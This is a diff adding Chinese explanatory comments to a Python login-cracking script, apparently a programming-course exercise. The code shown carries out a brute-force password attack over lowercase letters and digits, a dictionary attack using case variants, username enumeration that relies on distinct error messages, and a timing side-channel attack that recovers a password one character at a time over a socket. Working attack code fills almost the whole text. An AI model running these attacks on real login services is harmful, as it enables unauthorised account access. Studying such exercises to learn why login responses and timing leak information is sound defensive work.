@@ -13,21 +13,28 @@ BUFFER_SIZE = 1024
 SUCCESS_MSG = "Connection success!"
 OBTAINED_USERNAME = "Wrong password!"
 CAUGHT_LETTER = "Exception happened during login"
-chars = [chr(x) for x in range(97, 97 + 26)]
-chars += [str(x) for x in range(10)]
+chars = [chr(x) for x in range(97, 97 + 26)]             # chr() 将码点转为Unicode字符，得到 26个英文字符的list
+chars += [str(x) for x in range(10)]                     # 将整型转为字符串类型，得到阿拉伯数字的字符的list，chars 现为 [a-z0-9]
 
 
+# 获取网址的数据
 def get_data_from_url(url):
+    # 得到网址 url 的bytes
     data = request.urlopen(url)
+    # 将 bytes 解码为字符串，去掉两边的白空格后返回该字符串
     return map(str.strip, map(bytes.decode, data))
 
-
+# 暴力破解。用 26 个小写字母和 10 个数字生成随机密码
 def brute_force_attack_password(hostname, port):
+    # socket 连接的用法，先建一个元组，含主机和端口
+    # 再打开 socket.socket()，用它的 connect 方法传入刚建的元组建立网络连接
+    # 然后就可以在 socket 上面调用 send 发送编码后的 bytes
+    # 再用 recv 接收 bytes
     address = (hostname, port)
     with socket.socket() as hacker:
         hacker.connect(address)
         for i in range(1, len(chars) + 1):
-            for candidate in itertools.product(chars, repeat=i):
+            for candidate in itertools.product(chars, repeat=i):  # i 为多少则生成多少位的密码
                 password = "".join(candidate)
                 hacker.send(password.encode())
                 responses = hacker.recv(BUFFER_SIZE).decode()
@@ -39,6 +46,7 @@ def brute_force_attack_password(hostname, port):
 
 # generate all diversity of a word
 # using words as a list get the results
+# 生成同一个单词的各种大小写组合放到 words 里，字母顺序不变
 def recurse(convert, word, words):
     if word == "":
         words.append(convert)
@@ -51,6 +59,7 @@ def recurse(convert, word, words):
         recurse(convert + word[0].upper(), word[1:], words)
 
 
+# 每次从字典文件里取一个词，然后生成该词的大小写组合来尝试破解密码
 def dictionary_attack_password(hostname, port, dictionary_file):
     with open(dictionary_file) as file:
         with socket.socket() as hacker:
@@ -64,6 +73,7 @@ def dictionary_attack_password(hostname, port, dictionary_file):
                         return password
 
 
+# 判断延时是否正常，不正常表示当前位的密码字符正确，最终得到整个密码
 def crack_password(connection, login_json):
     login_json["password"] = passwd = ""
     total = 0
@@ -74,6 +84,7 @@ def crack_password(connection, login_json):
             total += 1
             login_json["password"] = passwd + ch
             start = datetime.timestamp(datetime.now()) * 1000000
+            # json.dumps 将字典序列化为 json字符串，再编码，发送
             connection.send(json.dumps(login_json).encode())
             srv_res = connection.recv(BUFFER_SIZE).decode()
             finish = datetime.timestamp(datetime.now()) * 1000000
@@ -93,6 +104,7 @@ def crack_password(connection, login_json):
                 break
 
 
+# 从文件里取用户名来一个个试，当提示密码错误时，表示用户名是对的，再尝试破解密码
 def dict_attack_loginname(hostname, port, login_names):
     with open(login_names) as login:
         # for login in get_data_from_url(ADMIN_LOGINS):
@@ -112,6 +124,8 @@ def dict_attack_loginname(hostname, port, login_names):
                     return
 
 
+# 获取系统命令行的参数：python hack.py arg1 arg2 arg3
+# python 不算参数，hack.py 是第一个参数，即 args[0]
 args = sys.argv
 if len(args) == 4:
     addr = (args[1], int(args[2]))
